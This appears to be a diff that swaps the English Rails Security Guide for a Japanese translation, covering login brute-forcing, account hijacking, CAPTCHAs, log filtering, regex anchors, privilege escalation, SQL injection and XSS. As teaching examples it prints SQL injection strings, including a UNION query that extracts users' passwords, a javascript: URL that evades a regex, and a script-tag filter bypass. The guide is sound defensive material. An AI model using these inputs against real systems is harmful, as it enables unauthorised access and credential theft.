+このような総当たり攻撃を少しでもかわすため、多くのWebアプリケーションではわざと具体的な情報を出さずに「ユーザー名またはパスワードが違います」という一般的なエラーメッセージを表示するようにしています。ユーザー名とパスワードどちらが違っているのかという情報を表示しないことで、総当たり攻撃による推測を少しでも遅らせます。「入力されたユーザー名は登録されていません」などという絶好の手がかりとなるメッセージを表示したら最後、攻撃者はすぐさまユーザー名リストを大量にかき集めて自動で巨大名簿を作成するでしょう。
 
-However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.
+しかし、Webアプリケーションのデザイナーがおろそかにしがちなのは、いわゆる「パスワードを忘れた場合」ページです。こうしたページではよく「入力されたユーザー名またはメールアドレスは登録されていません」という情報が表示されます。こうした情報を表示してしまうと、攻撃者がアカウントへの総当り攻撃に使う有効なユーザー名一覧を作成するのに利用されてしまいます。
 
-In order to mitigate such attacks, _display a generic error message on forgot-password pages, too_. Moreover, you can _require to enter a CAPTCHA after a number of failed logins from a certain IP address_. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.
+これを少しでも緩和するには、**「パスワードを忘れた場合」ページでも一般的なエラーメッセージを表示する**ようにしましょう。さらに**特定のIPアドレスからのログインが一定回数以上失敗した場合には、CAPTCHAの入力をユーザーに義務付ける**ようにしましょう。もちろん、この程度では自動化された総当たり攻撃プログラムからの攻撃から完全に逃れることはできません。こうしたプログラムは送信元IPアドレスを頻繁に変更するぐらいのことはやってのけるからです。しかしこの対策は攻撃に対するある程度の防御になることも確かです。
 
-### Account Hijacking
+### アカウントのハイジャック
 
-Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?.
+多くのWebアプリケーションでは、ユーザーアカウントを簡単にハイジャックできてしまいます。攻撃を困難にするような改良が進まないのはなぜでしょうか。
 
-#### Passwords
+#### パスワード
 
-Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring them to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _make change-password forms safe against CSRF_, of course. And _require the user to enter the old password when changing it_.
+攻撃者が、盗み出されたユーザーセッションcookieを手に入れ、それによってWebアプリケーションが標的ユーザーとの間で共用可能になった状態を考えてみましょう。パスワードが簡単に変更できる画面設計(古いパスワードの入力が不要)であれば、攻撃者は数クリックするだけでアカウントをハイジャックできてしまいます。あるいは、パスワード変更画面がCSRF攻撃に対して脆弱な作りになっている場合、攻撃者は標的ユーザーを別のWebページに誘い込み、CSRFを実行するように仕込まれたimgタグを踏ませて、標的ユーザーのWebパスワードを変更するでしょう。対応策としては、**パスワード変更フォームがCSRF攻撃に対して脆弱にならないようにすること**です。同時に、**ユーザーにパスワードを変更させる場合は、古いパスワードを必ず入力させることです**。
 
-#### E-Mail
+#### メール
 
-However, the attacker may also take over the account by changing the e-mail address. After they change it, they will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure _require the user to enter the password when changing the e-mail address, too_.
+しかし攻撃者は、登録されているメールアドレスを変更することでアカウントを乗っ取ろうとする可能性もありますので、注意が必要です。攻撃者は、メールアドレス変更に成功すると「パスワードを忘れた場合」ページに移動し、攻撃者の新しいメールアドレスに変更通知メールを送信します。システムによってはこのメールに新しいパスワードが記載されていることもあります。対応策は、**メールアドレスを変更する場合にもパスワード入力を必須にする**ことです。
 
-#### Other
+#### その他
 
-Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in an HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to their e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _review your application logic and eliminate all XSS and CSRF vulnerabilities_.
+Webアプリケーションの構成によっては、ユーザーアカウントをハイジャックする方法が他にも潜んでいる可能性があります。多くの場合、CSRFとXSSが原因となります。ここでは[GMailのCSRF脆弱性](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/) で紹介されている例をとりあげます。同記事の概念実証によると、この攻撃を受けた場合、標的ユーザーは攻撃者が支配するWebサイトに誘い込まれます。そのサイトのImgタグには仕掛けがあり、GMailのフィルタ設定を変更するHTTP GETリクエストがそこから送信されます。この標的ユーザーがGMailにログインしていた場合、フィルタ設定が攻撃者によって変更され、この場合はすべてのメールが攻撃者に転送されるようになります。この状態は、アカウント全体がハイジャックされたのと同じぐらいに有害です。対応策は、**アプリケーションのロジックを見なおしてXSSやCSRF脆弱性を完全に排除すること**です。
 
-### CAPTCHAs
+### CAPTCHA
 
-INFO: _A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect registration forms from attackers and comment forms from automatic spam bots by asking the user to type the letters of a distorted image. This is the positive CAPTCHA, but there is also the negative CAPTCHA. The idea of a negative CAPTCHA is not for a user to prove that they are human, but reveal that a robot is a robot._
+INFO: **CAPTCHAとは、コンピュータによる自動応答でないことを確認するためのチャレンジ-レスポンス式テストです。コメント入力欄などで、歪んだ画像に表示されている文字を入力させることで、入力者が自動スパムボットでないことを確認する場合によく使われます。ネガティブCAPTCHAという手法を使えば、入力者に自分が人間であることを証明させるかわりに、ボットを罠にはめて正体を暴くことができます。**
 
-A popular positive CAPTCHA API is [reCAPTCHA](https://developers.google.com/recaptcha/) which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. [ReCAPTCHA](https://github.com/ambethia/recaptcha/) is also a Rails plug-in with the same name as the API.
+CAPTCHAのAPIとしては[reCAPTCHA](https://developers.google.com/recaptcha/)が有名です。これは古書から引用した単語を歪んだ画像として表示します。初期のCAPTCHAでは背景を歪めたり文字を曲げたりしていましたが、後者は突破されたため、現在では文字の上に曲線も書き加えて強化しています。なお、reCAPTCHAは古書のデジタル化にも使えます。[ReCAPTCHA](https://github.com/ambethia/recaptcha/)はRailsのプラグインにもなっており、APIとして同じ名前が使われています。
 
-You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
-The problem with CAPTCHAs is that they have a negative impact on the user experience. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. Still, positive CAPTCHAs are one of the best methods to prevent all kinds of bots from submitting forms.
+このAPIからは公開鍵と秘密鍵の2つの鍵を受け取ります。これらはRailsの環境に置く必要があります。それにより、ビューで`recaptcha_tags`メソッドを、コントローラでは`verify_recaptcha`メソッドをそれぞれ利用できます。検証に失敗すると`verify_recaptcha`からfalseが返されます。
+CAPTCHAの問題は、ユーザーエクスペリエンスを多少損ねることです。さらに、弱視など視力に問題のあるユーザーはCAPTCHAの歪んだ画像をうまく読めないこともあります。なおポジティブCAPTCHAは、ボットによるあらゆるフォーム自動送信を防ぐ優れた方法のひとつです。
 
-Most bots are really dumb. They crawl the web and put their spam into every form's field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.
+ほとんどのボットは、単にWebページをクロールしてフォームを見つけてはスパム文を入力するだけのお粗末なものです。ネガティブCAPTCHAではこれを逆手に取り、フォームに「ハニーポット」フィールドを置いておきます。これは、CSSやJavaScriptを用いて人間には表示されないように設定されたダミーのフィールドです。
 
-Note that negative CAPTCHAs are only effective against dumb bots and won't suffice to protect critical applications from targeted bots. Still, the negative and positive CAPTCHAs can be combined to increase the performance, e.g.,  if the "honeypot" field is not empty (bot detected), you won't need to verify the positive CAPTCHA, which would require an HTTPS request to Google ReCaptcha before computing the response.
+ネガティブCAPTCHAが効果を発揮するのはWebをクロールする自動ボットからの保護のみであり、重要なサイトに狙いを定めるボットを防ぐのには不向きです。しかしネガティブCAPTCHAとポジティブCAPTCHAをうまく組み合わせればパフォーマンスを改善できることがあります。たとえば「ハニーポット」フィールドに何か入力された（=ボットが検出された）場合はポジティブCAPTCHAの検証は不要になり、レスポンス処理の前にGoogle ReCapchaにHTTPSリクエストを送信せずに済みます。
 
-Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:
+JavaScriptやCSSを用いてハニーポットフィールドを人間から隠す方法をいくつかご紹介します。
 
-* position the fields off of the visible area of the page
-* make the elements very small or color them the same as the background of the page
-* leave the fields displayed, but tell humans to leave them blank
+* ハニーポットフィールドを画面の外に追いやってユーザーから見えないようにする
+* フィールドを目に見えないくらい小さくしたり、背景と同じ色にしたりする
+* ハニーポットフィールドをあえて隠さず、「このフィールドには何も入力しないでください」と表示する
 
-The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on.
+最もシンプルなネガティブCAPTCHAは、「ハニーポット」フィールドを1つ使います。このフィールドはサーバー側でチェックします。フィールドに何か書き込まれていれば、入力者はボットであると判定できます。後はフォームの内容を無視するなり、通常通りメッセージを表示する(データベースには保存しない)などすればよいのです。通常のメッセージをもっともらしく表示しておけば、ボットは書き込み失敗に気が付かないまま満足して次の獲物を探すでしょう。
 
-You can find more sophisticated negative CAPTCHAs in Ned Batchelder's [blog post](http://nedbatchelder.com/text/stopbots.html):
+Ned Batchelderの[ブログ記事](http://nedbatchelder.com/text/stopbots.html)には、さらに洗練されたネガティブCAPTCHA手法がいくつか紹介されています。
 
-* Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.
-* Randomize the field names
-* Include more than one honeypot field of all types, including submission buttons
+* 現在のUTCタイムスタンプを含めたフィールドをフォームに含めておき、サーバー側でこのフィールドをチェックします。フィールドの時刻が遠い過去や未来の時刻であれば、そのフォームは無効です。
+* フィールド名をランダムに変更します
+* 送信ボタンを含むあらゆる型の数だけハニーポットフィールドを複数用意します。
 
-Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So _negative CAPTCHAs might not be good to protect login forms_.
+この方法で防御できるのは自動ボットだけであり、狙いを定めて特別に仕立てられたボットは防げません。つまり、ネガティブキャプチャはログインフォームの保護には必ずしも向いているとは限りません。
 
-### Logging
+### ログ出力
 
-WARNING: _Tell Rails not to put passwords in the log files._
+WARNING: **パスワードをRailsのログに出力しないこと。**
 
-By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can _filter certain request parameters from your log files_ by appending them to `config.filter_parameters` in the application configuration. These parameters will be marked [FILTERED] in the log.
+デフォルトでは、RailsのログにはWebアプリケーションへのリクエストがすべて出力されます。しかしログファイルにはログイン情報、クレジットカード番号などの情報が含まれていることがあるため、重大なセキュリティ問題の原因になることがあります。Webアプリケーションのセキュリティコンセプトを設計するときには、攻撃者がWebサーバーへのフルアクセスに成功してしまった場合のことも必ず考慮に含めておく必要があります。パスワードや機密情報をログファイルに平文のまま出力してしまうと、データベース上でこれらの情報を暗号化する意味がなくなってしまいます。Railsアプリケーションの設定ファイル config.filter_parameters に**特定のリクエストパラメータをログ出力時にフィルタする**設定を追加できます。フィルタされたパラメータはログ内で`[FILTERED]`という文字に置き換えられます。
 
 ```ruby
 config.filter_parameters << :password
 ```
 
-NOTE: Provided parameters will be filtered out by partial matching regular expression. Rails adds default `:password` in the appropriate initializer (`initializers/filter_parameter_logging.rb`) and cares about typical application parameters `password` and `password_confirmation`.
+NOTE: 指定したパラメータは正規表現の「部分マッチ」によって除外されます。Railsはデフォルトで`:password`を適切なイニシャライザ（`initializers/filter_parameter_logging.rb`）に追加し、アプリケーションの典型的な`password`パラメータや`password_confirmation`パラメータに配慮します。
 
-### Regular Expressions
+### 正規表現
 
-INFO: _A common pitfall in Ruby's regular expressions is to match the string's beginning and end by ^ and $, instead of \A and \z._
+INFO: **Rubyの正規表現で落とし穴になりやすいのは、より安全な`\A`や`\z`があることを知らずに危険な`^`や`$`を使ってしまうことです。**
 
-Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books get this wrong. So how is this a security threat? Say you wanted to loosely validate a URL field and you used a simple regular expression like this:
+Rubyの正規表現では、文字列の冒頭や末尾にマッチさせる方法が他の言語と若干異なります。このため、多くのRuby本やRails本でもこの点について間違った記載があります。いったいどのような問題が生じるのでしょうか。たとえば、URL形式になっているかどうかをざっくりと検証するために、以下のような単純な正規表現を使ったとします。
 
 ```ruby
   /^https?:\/\/[^\n]+$/i
 ```
 
-This may work fine in some languages. However, _in Ruby ^ and $ match the **line** beginning and line end_. And thus a URL like this passes the filter without problems:
+これは一部の言語では正常に動作します。しかし、**Rubyでは`^`や`$`は、入力全体の冒頭と末尾ではなく、「 行の」冒頭と末尾にマッチしてしまいます**。従って、この場合以下のような毒入りURLはフィルタを通過してしまいます。
 
 ```
 javascript:exploit_code();/*
@@ -554,260 +514,260 @@ http://hi.com
 */
 ```
 
-This URL passes the filter because the regular expression matches - the second line, the rest does not matter. Now imagine we had a view that showed the URL like this:
+上のURLがフィルタに引っかからないのは、入力の2行目にマッチしてしまうからです。従って、1行目と3行目にどんな文字列があってもフィルタを通過してしまいます。フィルタをすり抜けてしまったURLが、今度はビューの以下の箇所で表示されたとします。
 
 ```ruby
   link_to "Homepage", @user.homepage
 ```
 
-The link looks innocent to visitors, but when it's clicked, it will execute the JavaScript function "exploit_code" or any other JavaScript the attacker provides.
+表示されるリンクは一見無害に見えますが、クリックすると、攻撃者が送り込んだ邪悪なJavaScript関数を初めとするJavaScriptコードが実行されてしまいます。
 
-To fix the regular expression, \A and \z should be used instead of ^ and $, like so:
+これらの正規表現に含まれる危険な`^`や`$`は、安全な`\A`や`\z`に置き換える必要があります。
 
 ```ruby
   /\Ahttps?:\/\/[^\n]+\z/i
 ```
 
-Since this is a frequent mistake, the format validator (validates_format_of) now raises an exception if the provided regular expression starts with ^ or ends with $. If you do need to use ^ and $ instead of \A and \z (which is rare), you can set the :multiline option to true, like so:
+`^`や`$`をうっかり使ってしまうミスが頻発したため、Railsのフォーマットバリデータ(`validates_format_of`) では、正規表現の冒頭の`^`や末尾の`$`に対して例外を発生するようになりました。めったにないと思われますが、`\A`や`\z`の代りに`^`や`$`をどうしても使いたい場合は、`:multiline`オプションをtrueに設定することもできます。
 
 ```ruby
-  # content should include a line "Meanwhile" anywhere in the string
+  # この文字列のどの行にも"Meanwhile"という文字が含まれている必要がある
   validates :content, format: { with: /^Meanwhile$/, multiline: true }
 ```
 
-Note that this only protects you against the most common mistake when using the format validator - you always need to keep in mind that ^ and $ match the **line** beginning and line end in Ruby, and not the beginning and end of a string.
+この機能は、フォーマットバリデータ利用時に起きがちなミスから保護するだけのものであり、それ以上のものではない点にご注意ください。`^`や`$`はRubyでは **1つの行** に対してマッチし、文字列全体にはマッチしないということを開発者が十分理解しておくことが重要です。
 
-### Privilege Escalation
+### 権限昇格
 
-WARNING: _Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it._
+WARNING: **パラメータが1つ変更されただけでも、ユーザーが不正な権限でアクセスできるようになってしまうことがあります。パラメータは、たとえどれほど難読化し、隠蔽したとしても、変更される可能性が常にあることを肝に銘じてください。**
 
-The most common parameter that a user might tamper with, is the id parameter, as in `http://www.domain.com/project/1`, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:
+改ざんされる可能性が高いパラメータといえばidでしょう。`http://www.domain.com/project/1`の1がidです。このidはコントローラの`params`を経由して取得できます。コントローラ内では多くの場合、次のようなコードが使われている可能性があります。
 
 ```ruby
 @project = Project.find(params[:id])
 ```
 
-This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and they are not allowed to see that information, they will have access to it anyway. Instead, _query the user's access rights, too_:
+このコードで問題がないWebアプリケーションもあるにはありますが、そのユーザーがすべてのビューを参照する権限を持っていない場合には問題となります。このユーザーがURLのidを42に変更し、本来のidでは表示できないページを表示できてしまうからです。このようなことにならないよう、**ユーザーのアクセス権も必ずクエリに含めてください**。
 
 ```ruby
 @project = @current_user.projects.find(params[:id])
 ```
 
-Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, _no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated_.
+Webアプリケーションによっては、ユーザーが改ざん可能なパラメータが他にも潜んでいる可能性があります。要するに、**安全確認が終わっていないユーザー入力が安全である可能性はゼロであり、ユーザーから送信されるいかなるパラメータであっても、何らかの操作が加えられている可能性が常にある**ということです。
 
-Don't be fooled by security by obfuscation and JavaScript security. Developer tools let you review and change every form's hidden fields. _JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. The Firebug addon for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.
+難読化とJavaScriptによる検証のセキュリティだけでお茶を濁してはいけません。ブラウザのWeb Developer Toolbarを使えば、フォームの隠しフィールドを見つけて変更することもできます。**JavaScriptを使ってユーザーの入力データを検証することはできても、攻撃者が想定外の値を与えて邪悪なリクエストを送信することは阻止しようがありません**。Mozilla Firefox用のFirebugアドオンを使えば、すべてのリクエストをログに記録して、リクエストを繰り返し送信することも、リクエストを変更することもできてしまいます。さらに、JavaScriptによる検証はブラウザのJavaScriptをオフにするだけで簡単にバイパスできてしまいます。さらに、クライアントやインターネットのあらゆるリクエストやレスポンスを密かに傍受するプロキシがクライアント側に潜んでいる可能性すらあります。
 
-Injection
+インジェクション
 ---------
 
-INFO: _Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection._
+INFO: **インジェクション (注入) とは、Webアプリケーションに邪悪なコードやパラメータを導入して、そのときのセキュリティ権限で実行させることです。XSS (クロスサイトスクリプティング) やSQLインジェクションはインジェクションの顕著な例です。**
 
-Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query, or programming language, the shell, or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.
+インジェクションによって注入されるコードやパラメータは、あるコンテキストではきわめて有害であっても、それ以外のほとんどのコンテキストでは無害です。その意味で、インジェクションは非常にトリッキーであると言えます。ここでいうコンテキストとは、スクリプティング、クエリ、プログラミング言語、シェル、RubyやRailsのメソッドなどがあります。以下の節では、インジェクション攻撃で発生する可能性のある重要なコンテキストについて説明します。ただし最初の節では、インジェクションに関連するアーキテクチャ上の決定事項について説明します。
 
-### Permitted lists versus Restricted lists
+### ホワイトリスト方式とブラックリスト方式
 
-NOTE: _When sanitizing, protecting, or verifying something, prefer permitted lists over restricted lists._
+NOTE: **通常、サニタイズや保護や検証では、ブラックリスト方式よりもホワイトリスト方式が望ましい方法です。**
 
-A restricted list can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a permitted list which lists the good e-mail addresses, public actions, good HTML tags, and so on. Although sometimes it is not possible to create a permitted list (in a SPAM filter, for example), _prefer to use permitted list approaches_:
+ブラックリストに使われるのは、有害なメールアドレス、publicでないアクション、邪悪なHTMLタグなどです。ホワイトリストはこれと真逆で、有害ではないメールアドレス、publicなアクション、無害なHTMLタグなどがホワイトリストになります。スパムフィルタなど、対象によってはホワイトリストを作成しようがないこともありますが、**基本的にホワイトリスト方式を使いましょう**。
 
-* Use before_action except: [...] instead of only: [...] for security-related actions. This way you don't forget to enable security checks for newly added actions.
-* Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.
-* Don't try to correct user input using restricted lists:
-    * This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
-    * But reject malformed input
+* セキュリティに関連する`before_action`では、`except: [...]`ではなく`only: [...]`を使いましょう。その方が将来コントローラにアクションを追加するときにセキュリティチェックを忘れずに済みます。
+* クロスサイトスクリプティング (XSS) 対策として`<script>`を削除するブラックリスト方式ではなく、たとえば`<strong>`だけを許可するホワイトリスト方式にしましょう。理由については以下をご覧ください。
+* ユーザー入力データをブラックリスト方式で訂正してはいけません。
+    * そのようなことをすると、たとえば`"<sc<script>ript>".gsub("<script>", "")`という攻撃にやられてしまいます。
+    * 有害な入力は断固拒否してください。
 
-Permitted lists are also a good approach against the human factor of forgetting something in the restricted list.
+特定の項目だけを許可するホワイトリスト方式は、ブラックリストへの追加漏れのようなヒューマンエラーに強いのも望ましい点です。
 
-### SQL Injection
+### SQLインジェクション
 
-INFO: _Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._
+INFO: **さまざまなよい手法が出現したおかげで、SQLインジェクションがRailsアプリケーションで問題になることはめったになくなりました。しかしSQLインジェクションはひとたび発生すれば壊滅的な打撃を受ける可能性があり、Webアプリケーションに対する一般的な攻撃方法でもあるため、この問題を十分に理解することが重要です。**
 
-#### Introduction
+#### はじめに
 
-SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:
+SQLインジェクションは、Webアプリケーションのパラメータを操作してデータベースクエリに影響を与えることを目的とした攻撃手法です。SQLインジェクションは、認証をバイパスする目的でよく使われます。他にも、データを操作したり任意のデータを読み出したりする目的にも使われます。クエリのユーザー入力データをそのまま使わずに改ざんする方法の例を以下で説明します。
 
 ```ruby
 Project.where("name = '#{params[:name]}'")
 ```
 
-This could be in a search action and the user may enter a project's name that they want to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:
+上のコードは検索用のアクションなどで使われるものであり、ユーザーは検索したいプロジェクト名を入力します。ここで、悪意のあるユーザーが`' OR 1 --`という文字列を入力すると、以下のSQLクエリが生成されます。
 
 ```sql
 SELECT * FROM projects WHERE name = '' OR 1 --'
 ```
 
-The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.
+2つのダッシュ「`--`」が末尾に置かれると、以後に追加されるクエリがすべてコメントと見なされてしまい、実行されなくなります。そのため、projectsテーブルからすべてのレコードが取り出されます。これらは通常のユーザーからは参照できないはずのものです。これは、クエリですべての条件がtrueになっているために発生しています。
 
-#### Bypassing Authorization
+#### 認証のバイパス
 
-Usually a web application includes access control. The user enters their login credentials and the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.
+Webアプリケーションでは何らかの形でアクセス制御が行われるのが普通です。ユーザーがログイン情報を入力すると、Webアプリケーションはユーザーテーブルに登録されているレコードとマッチするかどうかを調べます。既存のレコードとマッチする場合、アプリケーションはアクセスを許可します。しかし、攻撃者がSQLインジェクションでこの認証をすり抜けてしまう可能性があります。以下はRailsにおける典型的なデータベースクエリです。ユーザーが入力したログイン情報パラメータとマッチするUserテーブル上の最初のレコードを返します。
 
 ```ruby
 User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
 ```
 
-If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:
+ここで攻撃者が「`' OR '1'='1`」という文字列を名前フィールドに入力し、「`' OR '2'>'1`」をパスワードフィールドに入力すると以下のSQLクエリが生成されます。
 
 ```sql
 SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
 ```
 
-This will simply find the first record in the database, and grants access to this user.
+マッチする最初のレコードがこのクエリによって取得され、ユーザーにアクセスが許可されてしまいます。
 
-#### Unauthorized Reading
+#### 不正なデータ読み出し
 
-The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:
+UNION文は2つのSQLクエリをつなぎ、1つのセットとしてデータを返します。攻撃者がUNIONでデータベースから任意のデータを読み出す可能性があります。再び上の例を用いて説明します。
 
 ```ruby
 Project.where("name = '#{params[:name]}'")
 ```
 
-And now let's inject another query using the UNION statement:
+ここで、UNION文を用いて以下の文字列を注入したとします。
 
 ```
 ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
 ```
 
-This will result in the following SQL query:
+これによって以下のSQLが生成されます。
 
 ```sql
 SELECT * FROM projects WHERE (name = '') UNION
   SELECT id,login AS name,password AS description,1,1,1 FROM users --'
 ```
 
-The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.
+このクエリで得られるのはプロジェクトのリストではなく(名前が空欄のプロジェクトはないので)、ユーザー名とパスワードのリストです。データベース上のパスワードが暗号化されていればまだ最悪の事態は避けられます。一方、攻撃者にとっての問題は、両方のクエリでカラムの数を同じにしなければならないことだけです。この攻撃用文字列では、そのために2番目のクエリに「1」を連続して配置しています。これらの値は常に1になるので、1番目のクエリのカラム数と一致します。
 
-Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails [to at least 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).
+同様に、2番目のクエリではカラム名をASでリネームしています。これにより、ユーザーテーブルから取り出した値がWebアプリケーション上で表示されます。Railsを[最低でも2.1.1にアップデート](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/)してください。
 
-#### Countermeasures
+#### 対応策
 
-Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character, and line breaks. *Using `Model.find(id)` or `Model.find_by_some thing(something)` automatically applies this countermeasure*. But in SQL fragments, especially *in conditions fragments (`where("...")`), the `connection.execute()` or `Model.find_by_sql()` methods, it has to be applied manually*.
+Ruby on Railsには、特殊なSQL文字をフィルタが組み込まれており、「`'`」「`"`」「NULL」「改行」をエスケープします。**`Model.find(id)`や`Model.find_by_なんちゃら(かんちゃら)`といったクエリでは自動的にこの対応策が適用されます**。ただし、SQLフラグメント、特に**条件フラグメント (`where("...")`)、`connection.execute()`または`Model.find_by_sql()`メソッド**については手動でエスケープする必要があります。
 
-Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:
+条件オプションに文字列を直接渡す代りに、以下のように配列を渡すことで、汚染された文字列をサニタイズすることもできます。
 
 ```ruby
 Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
 ```
 
-As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:
+上に示したように、配列の最初の部分がSQLフラグメントになっており、その中に疑問符「`?`」が含まれています。サニタイズされた変数は、配列の後半に置かれており、フラグメント内の疑問符を置き換えます。ハッシュを渡して同じ結果を得ることもできます。
 
 ```ruby
 Model.where(login: entered_user_name, password: entered_password).first
 ```
 
-The array or hash form is only available in model instances. You can try `sanitize_sql()` elsewhere. _Make it a habit to think about the security consequences when using an external string in SQL_.
+モデルのインスタンスでは、配列またはハッシュのみを利用できます。それ以外の場所では`sanitize_sql()`を使うのもよいでしょう。**SQLで外部の文字列をサニタイズせずに使うと、セキュリティ上重大な結果がもたらされる可能性があることに普段から注意する習慣をつけましょう**。
 
-### Cross-Site Scripting (XSS)
+### クロスサイトスクリプティング (XSS)
 
-INFO: _The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._
+INFO: **XSSは最も発生しやすいWebセキュリティ上の脆弱性であり、ひとたび発生すると壊滅的な影響が生じる可能性があります。XSSを利用した悪意のある攻撃が行われると、クライアント側のコンピュータに実行可能なコードが注入されてしまいます。Railsには、このような攻撃をかわすためのヘルパーメソッドが用意されています。**
 
-#### Entry Points
+#### 攻撃点
 
-An entry point is a vulnerable URL and its parameters where an attacker can start an attack.
+攻撃点 (entry point) とは、攻撃者が攻撃を向ける対象となる、脆弱なURLおよびパラメータのことです。
 
-The most common entry points are message posts, user comments, and guest books, but project titles, document names, and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications or client-site proxies make it easy to change requests. There are also other attack vectors like banner advertisements.
+攻撃点として最も選ばれやすいのはメッセージ投稿、ユーザーコメント、ゲストブックですが、プロジェクトタイトル、ドキュメント名、検索結果ページなども同様に脆弱性を抱えていたことがありました。ユーザーがデータを入力可能なあらゆる部分が攻撃点になる可能性があります。ただし、攻撃者がデータを入力するのはWebサイト上の入力ボックスとは限りません。URLに含まれているパラメータ、URLに直接含まれていないが利用可能な「隠れた」パラメータ、URLに含まれない内部パラメータ、どれも攻撃者がデータを入力する可能性があります。攻撃者がすべてのトラフィックを傍受している可能性を常に考慮に入れる必要があります。アプリケーションプロキシやクライアント側プロキシを悪用すれば、リクエストを簡単に改ざんできます。
 
-XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.
